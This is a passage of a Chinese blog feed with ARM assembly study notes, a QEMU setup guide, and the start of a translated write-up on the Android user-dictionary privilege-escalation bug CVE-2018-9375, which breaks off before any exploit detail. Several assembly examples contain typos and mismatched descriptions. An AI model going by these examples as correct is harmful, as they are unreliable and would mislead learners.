&lt;td&gt;N等于V&lt;/td&gt;
&lt;td&gt;带符号数大于或等于&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;1011&lt;/td&gt;
&lt;td&gt;LT&lt;/td&gt;
&lt;td&gt;N不等于V&lt;/td&gt;
&lt;td&gt;带符号数小于&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;1100&lt;/td&gt;
&lt;td&gt;GT&lt;/td&gt;
&lt;td&gt;Z清零且（N等于V）&lt;/td&gt;
&lt;td&gt;带符号数大于&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;1101&lt;/td&gt;
&lt;td&gt;LE&lt;/td&gt;
&lt;td&gt;Z置位或（N不等于V）&lt;/td&gt;
&lt;td&gt;带符号数小于或等于&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;1110&lt;/td&gt;
&lt;td&gt;AL&lt;/td&gt;
&lt;td&gt;忽略&lt;/td&gt;
&lt;td&gt;无条件执行&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&#34;程序结构&#34;&gt;程序结构&lt;/h3&gt;

&lt;p&gt;Android平台采用的是GUN ARM汇编格式，汇编器为GAS&lt;/p&gt;

&lt;p&gt;参数传递：R0-R3这4个寄存器用来传递函数调用的第1到4个参数，超出的参数通过堆栈来传递。R0还用来存放函数调用的返回值。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180810112712.gif&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h5 id=&#34;汇编器指令&#34;&gt;汇编器指令&lt;/h5&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;.file&lt;/code&gt;:源文件名&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.align&lt;/code&gt;:代码对齐方式&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.ascii&lt;/code&gt;:声明字符串&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.global&lt;/code&gt;:声明全局符号&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.type&lt;/code&gt;：指定符号的类型&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.word&lt;/code&gt;：存放地址值&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.size&lt;/code&gt;：设置指定符号的大小&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.ident&lt;/code&gt;：编译器标识&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;寻址方式&#34;&gt;寻址方式&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;立即寻址&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code&gt;MOV R0, #1234&lt;/code&gt;     -&amp;gt;R0=1234&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;寄存器寻址&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code&gt;MOV R1 = R2&lt;/code&gt;   -&amp;gt;R0=R1&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;寄存器移位寻址&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;LSL ：逻辑左移，移位后寄存器空出的低位补0&lt;/li&gt;
&lt;li&gt;LSR：逻辑右移，移位后寄存器空出的高位补0&lt;/li&gt;
&lt;li&gt;ASR：算术右移，移位过程中符号位保持不变，若源操作数为正数，则移位后空出的高位补0，否则补1。&lt;/li&gt;
&lt;li&gt;ROR：循环右移，移位后移出的低位填入移位空出的高位。&lt;/li&gt;
&lt;li&gt;RRX：带扩展的循环右移，操作数右移一位，移出的空位用C标志的值填充。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code&gt;MOV R0, R1, LSL #2&lt;/code&gt;  -&amp;gt;R1左移两位（R1&amp;lt;&amp;lt;2）赋值给R0,相当于R0 = R1*4&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;寄存器间接寻址&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code&gt;LDR RO, [R1]&lt;/code&gt;  -&amp;gt;将R1寄存器的数值作为地址，取出此地址中的值赋给R0寄存器&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;基址寻址&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;多用于查表、数组访问操作。&lt;/p&gt;

&lt;p&gt;&lt;code&gt;LDR R0, [R1,#-4]&lt;/code&gt; -&amp;gt;将R1寄存器的数值减4作为地址，取出此地址的值赋给R0寄存器。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;多寄存器寻址&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;一条指令最多完成16个通用寄存器值的传送。&lt;/p&gt;

&lt;p&gt;&lt;code&gt;LDMIA R0,{R1,R2,R3,R4}&lt;/code&gt; -&amp;gt;LDM为数据加载指令，指令的后缀IA表示每次执行完加载操作后R0寄存器的值自增1个字，ARM指令集中，子表示的是一个32位数值。这条指令作用为：R1 = [R0],R2 = [R0+#4],R3 = [R0+#8],R4 = [R0+#12]。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;堆栈寻址&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;特定的指令来完成：&lt;code&gt;LDMFA/STMFA&lt;/code&gt;、&lt;code&gt;LDMEA/STMEA&lt;/code&gt;、&lt;code&gt;LDMFD/STMFD&lt;/code&gt;、&lt;code&gt;LDMED/STMED&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;LDM和STM为指令前缀，表示多寄存器寻址，即一次传送多个寄存器的值。后面的后缀为指令后缀。&lt;/p&gt;

&lt;p&gt;&lt;code&gt;STMFD SP!, {R1-R7,LR}&lt;/code&gt;  -&amp;gt;将R1~R7,LR入栈，多用于保存子程序的现场。&lt;/p&gt;

&lt;p&gt;&lt;code&gt;LDMFD SP!, {R1-R7,LR}&lt;/code&gt; -&amp;gt;出栈，恢复现场。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;块拷贝寻址&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;实现从连续地址数据从存储器的某一位置拷贝到另外一个位置，指令有：&lt;code&gt;LDMIA/STMIA&lt;/code&gt;、&lt;code&gt;LDMDA/STMDA&lt;/code&gt;、&lt;code&gt;LDMIB/STMIB&lt;/code&gt;、&lt;code&gt;LDMDB/STMDB&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;&lt;code&gt;LDMIA R0! {R0-R3}&lt;/code&gt;  从R0寄存器指向的存储单元中读取3个字到R1-R3寄存器&lt;/p&gt;

&lt;p&gt;&lt;code&gt;STMIA R0! {R0-R3}&lt;/code&gt; 存储从R1-R3寄存器的内容到R0寄存器指向的存储单元&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;相对寻址&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;以程序计数器PC的当前值为基地址，指令中的地址标号作为偏移量，将两者相加之后得到操作数的有效地址。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;  BL NEXT
    ····
  NEXT:
    ········
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;arm和thumb指令集&#34;&gt;ARM和Thumb指令集&lt;/h3&gt;

&lt;h5 id=&#34;基本指令简述&#34;&gt;基本指令简述&lt;/h5&gt;

&lt;p&gt;&lt;code&gt;MNEMONIC{S}{condition} {Rd}, Operand1, Operand2&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;助记符{是否使用CPSR}{是否条件执行以及条件} {目的寄存器}, 操作符1, 操作符2&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;MNEMONIC     - 指令的助记符如ADD&lt;/p&gt;

&lt;p&gt;{S}                      - 可选的扩展位，如果指令后加了S，则需要依据计算结果更新CPSR寄存器中的条件跳转相关    的FLAG&lt;/p&gt;

&lt;p&gt;{condition}        - 如果机器码要被条件执行，那它需要满足的条件标示&lt;/p&gt;

&lt;p&gt;{Rd}                    - 存储结果的目的寄存器&lt;/p&gt;

&lt;p&gt;Operand1     - 第一个操作数，寄存器或者是一个立即数&lt;/p&gt;

&lt;p&gt;Operand2     - 第二个(可变的)操作数，可以是一个立即数或者寄存器或者有偏移量的寄存器&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;第二操作数还有如下操作：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;#123                    - 立即数
Rx                      - 寄存器比如R1
Rx, ASR n               - 对寄存器中的值进行算术右移n位后的值
Rx, LSL n               - 对寄存器中的值进行逻辑左移n位后的值
Rx, LSR n               - 对寄存器中的值进行逻辑右移n位后的值
Rx, ROR n               - 对寄存器中的值进行循环右移n位后的值
Rx, RRX                 - 对寄存器中的值进行带扩展的循环右移1位后的值
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;ADD   R0, R1, R2         - 将第一操作数R1的内容与第二操作数R2的内容相加，将结果存储到R0中。
ADD   R0, R1, #2         - 将第一操作数R1的内容与第二操作数一个立即数相加，将结果存到R0中
MOVLE R0, #5             - 当满足条件LE(Less and Equal,小于等于0)将第二操作数立即数5移动到R0中,注意这条指令与MOVLE R0, R0, #5相同
MOV   R0, R1, LSL #1     - 将第二操作数R1寄存器中的值逻辑左移1位后存入R0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180810144732.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h5 id=&#34;内存访问相关指令&#34;&gt;内存访问相关指令&lt;/h5&gt;

&lt;p&gt;通常，LDR被用来从内存中加载数据到寄存器，STR被用作将寄存器的值存放到内存中。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180810145231.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;例子：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;.data          /* 数据段是在内存中动态创建的，所以它的在内存中的地址不可预测*/
var1: .word 3  /* 内存中的第一个变量 */
var2: .word 4  /* 内存中的第二个变量 */
.text          /* 代码段开始 */ 
.global _start
_start:
    ldr r0, adr_var1  @ 将存放var1值的地址adr_var1加载到寄存器R0中 
    ldr r1, adr_var2  @ 将存放var2值的地址adr_var2加载到寄存器R1中 
    ldr r2, [r0]      @ 将R0所指向地址中存放的0x3加载到寄存器R2中  
    str r2, [r1]      @ 将R2中的值0x3存放到R1做指向的地址 
    bkpt             
adr_var1: .word var1  /* var1的地址助记符 */
adr_var2: .word var2  /* var2的地址助记符 */
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180810145711.gif&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180810154906.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;第一种偏移形式：立即数作偏移&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;  STR    Ra, [Rb, imm]
  LDR    Ra, [Rc, imm]
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;  
  .data
  var1: .word 3
  var2: .word 4
  .text
  .global _start
  _start:
      ldr r0, adr_var1  @ 将存放var1值的地址adr_var1加载到寄存器R0中 
      ldr r1, adr_var2  @ 将存放var2值的地址adr_var2加载到寄存器R1中 
      ldr r2, [r0]      @ 将R0所指向地址中存放的0x3加载到寄存器R2中  
      str r2, [r1, #2]  @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加2所指向地址处。
      str r2, [r1, #4]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加4所指向地址处，之后R1寄存器中存储的值加4,也就是R1=R1+4。
      ldr r3, [r1], #4  @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中存储的值加4,也就是R1=R1+4。
      bkpt
  adr_var1: .word var1
  adr_var2: .word var2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180810160844.gif&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;第二种偏移形式：寄存器作偏移&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;  STR    Ra, [Rb, Rc]
  LDR    Ra, [Rb, Rc]
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;  .data
  var1: .word 3
  var2: .word 4
  .text
  .global _start
  _start:
      ldr r0, adr_var1  @ 将存放var1值的地址adr_var1加载到寄存器R0中 
      ldr r1, adr_var2  @ 将存放var2值的地址adr_var2加载到寄存器R1中 
      ldr r2, [r0]      @ 将R0所指向地址中存放的0x3加载到寄存器R2中  
      str r2, [r1, r2]  @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加R2寄存器的值所指向地址处。R1寄存器不会被修改。 
      str r2, [r1, r2]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加R2寄存器的值所指向地址处，之后R1寄存器中的值被更新,也就是R1=R1+R2。
      ldr r3, [r1], r2  @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中的值被更新也就是R1=R1+R2。
      bx lr
  adr_var1: .word var1
  adr_var2: .word var2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180810162217.gif&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;第三种偏移形式：寄存器缩放值作偏移&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;  LDR    Ra, [Rb, Rc, &amp;lt;shifter&amp;gt;]
  STR    Ra, [Rb, Rc, &amp;lt;shifter&amp;gt;]
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;  .data
  var1: .word 3
  var2: .word 4
  .text
  .global _start
  _start:
      ldr r0, adr_var1         @ 将存放var1值的地址adr_var1加载到寄存器R0中 
      ldr r1, adr_var2         @ 将存放var2值的地址adr_var2加载到寄存器R1中 
      ldr r2, [r0]             @ 将R0所指向地址中存放的0x3加载到寄存器R2中  
      str r2, [r1, r2, LSL#2]  @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加(左移两位后的R2寄存器的值)所指向地址处。R1寄存器不会被修改。
      str r2, [r1, r2, LSL#2]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加(左移两位后的R2寄存器的值)所指向地址处，之后R1寄存器中的值被更新,也就R1 = R1 + R2&amp;lt;&amp;lt;2。
      ldr r3, [r1], r2, LSL#2  @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中的值被更新也就是R1 = R1 + R2&amp;lt;&amp;lt;2。
      bkpt
  adr_var1: .word var1
  adr_var2: .word var2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180810162414.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;如何区分取址模式：&lt;/p&gt;

&lt;p&gt;如果有一个叹号!，那就是索引前置取址模式，即使用计算后的地址，之后更新基址寄存器。&lt;/p&gt;

&lt;p&gt;如果在[]外有一个寄存器，那就是索引后置取址模式，即使用原有基址寄存器重的地址，之后再更新基址寄存器&lt;/p&gt;

&lt;p&gt;除此之外，就都是偏移取址模式了&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;关于PC相对取址的LDR指令&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;有时候LDR并不仅仅被用来从内存中加载数据。还有如下这操作:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;  .section .text
  .global _start
  _start:
     ldr r0, =jump        /* 加载jump标签所在的内存位置到R0 */
     ldr r1, =0x68DB00AD  /* 加载立即数0x68DB00AD到R1 */
  jump:
     ldr r2, =511         /* 加载立即数511到R2 */ 
     bkpt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这些指令学术上被称作伪指令。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;在ARM中使用立即数的规律&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在ARM中不能像X86那样直接将立即数加载到寄存器中。因为你使用的立即数是受限的。&lt;/p&gt;

&lt;p&gt;立即数的值：v = n ror 2*r 有效的立即数都可以通过循环右移来得到&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;  #256        // 1 循环右移 24位 --&amp;gt; 256
  #384        // 6 循环右移 26位 --&amp;gt; 384
  #484        // 121 循环右移 30位 --&amp;gt; 484
  #16384      // 1 循环右移 18位 --&amp;gt; 16384
  #2030043136 // 121 循环右移 8位 --&amp;gt; 2030043136
  #0x06000000 // 6 循环右移 8位 --&amp;gt; 100663296 (十六进制值0x06000000)
  Invalid values:
  #370        // 185 循环右移 31位 --&amp;gt; 31不在范围内 (0 – 30)
  #511        // 1 1111 1111 --&amp;gt; 比特模型不符合
  #0x06010000 // 1 1000 0001.. --&amp;gt; 比特模型不符合
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这样并不能一次性加载所有的32位值。不过我们可以通过以下的两个选项来解决这个问题：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;用小部分去组成更大的值。    MOV r0, #511  将511分成两部分：MOV r0, #256, and ADD r0, #255&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;.section .text
.global _start
_start:
 mov r0, #256   /* 1 ror 24 = 256, so it&#39;s valid */
 add r0, #255   /* 255 ror 0 = 255, valid. r0 = 256 + 255 = 511 */
 ldr r1, =511   /* load 511 from the literal pool using LDR */
 bkpt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;计算立即数的有效值脚本：&lt;a href=&#34;https://raw.githubusercontent.com/azeria-labs/rotator/master/rotator.py&#34;&gt;https://raw.githubusercontent.com/azeria-labs/rotator/master/rotator.py&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;azeria@labs:~$ python rotator.py
Enter the value you want to check: 511
Sorry, 511 cannot be used as an immediate number and has to be split.
azeria@labs:~$ python rotator.py
Enter the value you want to check: 256
The number 256 can be used as a valid immediate number.
1 ror 24 --&amp;gt; 256
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;下面的部分指令用到在详细查，记的话脑壳痛&lt;/p&gt;

&lt;p&gt;##### 跳转指令&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;code&gt;B&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;BL&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;BX&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;BXL&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;##### 存储器操作指令&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;code&gt;LDM&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;STM&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;PUSH&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;POP&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SWP&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;##### 数据处理&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;code&gt;MOV&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;MVN&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ADD&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ADC&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SUB&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;RSB&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SBC&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;RSC&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;MUL&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;MLS&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;MLA&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;UMULL&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;UMLAL&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SMUULL&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SMLAL&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SMLAD&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SMLSD&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SDIV&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;UDIV&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ASR&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;AND&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ORR&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;EOR&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;BIC&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;LSL&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;LSR&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;RRX&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ROR&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;CMP&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;CMN&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;TSL&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;TEQ&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;##### 其他指令&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;SWI&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;code&gt;NOP&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;code&gt;MRS&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;code&gt;MSR&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;###&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>QEMU的安装使用</title>
      <link>https://naivete.cc/post/qume%E7%9A%84%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/</link>
      <pubDate>Thu, 09 Aug 2018 19:34:34 +0800</pubDate>
      
      <guid>https://naivete.cc/post/qume%E7%9A%84%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/</guid>
      
        <description>

&lt;h1 id=&#34;qemu的安装使用&#34;&gt;QEMU的安装使用&lt;/h1&gt;

&lt;h3 id=&#34;安装&#34;&gt;安装&lt;/h3&gt;

&lt;p&gt;WIndows：&lt;a href=&#34;https://qemu.weilnetz.de/w64/&#34;&gt;https://qemu.weilnetz.de/w64/&lt;/a&gt; 下载exe安装就行&lt;/p&gt;

&lt;p&gt;MACOS:&lt;code&gt;brew install qemu&lt;/code&gt;  or &lt;code&gt;sudo port install qemu&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;LINUX：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Arch:&lt;/strong&gt; &lt;code&gt;pacman -S qemu&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Debian/Ubuntu:&lt;/strong&gt; &lt;code&gt;apt-get install qemu&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Fedora:&lt;/strong&gt; &lt;code&gt;dnf install @virtualization&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Gentoo:&lt;/strong&gt; &lt;code&gt;emerge --ask app-emulation/qemu&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;RHEL/CentOS:&lt;/strong&gt; &lt;code&gt;yum install qemu-kvm&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;SUSE:&lt;/strong&gt; &lt;code&gt;zypper install qemu&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;源码安装：&lt;a href=&#34;https://download.qemu.org/&#34;&gt;https://download.qemu.org/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;wget&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;wget https://download.qemu.org/qemu-3.0.0-rc1.tar.xz
tar xvJf qemu-3.0.0-rc1.tar.xz
cd qemu-3.0.0-rc1
./configure
make
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;git&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;git clone git://git.qemu.org/qemu.git
cd qemu
git submodule init
git submodule update --recursive
./configure
make
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;最新的开发发生在主分支上。稳定的树位于名为“稳定x”的分支中。YY分支,X。YY是发布版本。&lt;/p&gt;

&lt;h3 id=&#34;树莓派内核制作-在windows上&#34;&gt;树莓派内核制作（在windows上)&lt;/h3&gt;

&lt;p&gt;下载树莓派系统：&lt;a href=&#34;http://downloads.raspberrypi.org/raspbian/images/&#34;&gt;http://downloads.raspberrypi.org/raspbian/images/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;下载qume 的树莓派内核： &lt;a href=&#34;https://github.com/dhruvvyas90/qemu-rpi-kernel&#34;&gt;https://github.com/dhruvvyas90/qemu-rpi-kernel&lt;/a&gt;   改名为kernel-qemu放在和系统镜像同目录下&lt;/p&gt;

&lt;p&gt;放在了raspbia目录下&lt;/p&gt;

&lt;p&gt;&lt;code&gt;qemu-system-arm.exe -kernel kernel-qemu -cpu arm1176 -m 512 -M versatilepb -dtbversatile-pb.dtb -no-reboot -append &amp;quot;root=/dev/sda2 panic=1rootfstype=ext4 rw&amp;quot; -net nic -net user,hostfwd=tcp::5022-:22 -hda 2018-06-27-raspbian-stretch.img&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;注意自己下载的镜像版本&lt;/p&gt;

&lt;h3 id=&#34;linux上&#34;&gt;Linux上&lt;/h3&gt;

&lt;p&gt;待补充。。。&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>在Android的个人字典中发现和利用漏洞(CVE-2018-9375)</title>
      <link>https://naivete.cc/post/%E8%AF%91%E5%9C%A8android%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%AD%97%E5%85%B8%E4%B8%AD%E5%8F%91%E7%8E%B0%E5%92%8C%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9Ecve-2018-9375/</link>
      <pubDate>Sun, 05 Aug 2018 21:16:52 +0800</pubDate>
      
      <guid>https://naivete.cc/post/%E8%AF%91%E5%9C%A8android%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%AD%97%E5%85%B8%E4%B8%AD%E5%8F%91%E7%8E%B0%E5%92%8C%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9Ecve-2018-9375/</guid>
      
        <description>

&lt;blockquote&gt;
&lt;p&gt;翻译的文章 渣渣翻译
原作者：Daniel Kachakil&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;我正在审计一款Android手机，审计范围是所有已经安装了的应用程序。我的首选方法是，在时间允许的时候，就手动检查尽可能多的代码。我发现了一个巧妙的漏洞，这个漏洞允许我与一个内容提供者交互，而该内容提供者应该在最近的Android版本中受到保护：用户的个人词典，它存储了用户想要保留的非标准单词的拼写。&lt;/p&gt;

&lt;p&gt;虽然理论上应该只授权给特权用户、授权的输入法编辑器(IMEs) ，以及拼写检查程序访问用户的个人词典，但是有一种方法可以绕过这些限制，允许恶意应用程序更新、删除甚至检索字典内的所有内容。而不需要任何权限或者与用户交互。&lt;/p&gt;

&lt;p&gt;这个中等风险的漏洞被归类为权限提升，并于2018年6月修复，影响到Android的以下版本：6.0、6.0.1、7.0、7.1.1、7.1.2、8.0和8.1。&lt;/p&gt;

&lt;h3 id=&#34;用户的个人词典&#34;&gt;用户的个人词典&lt;/h3&gt;

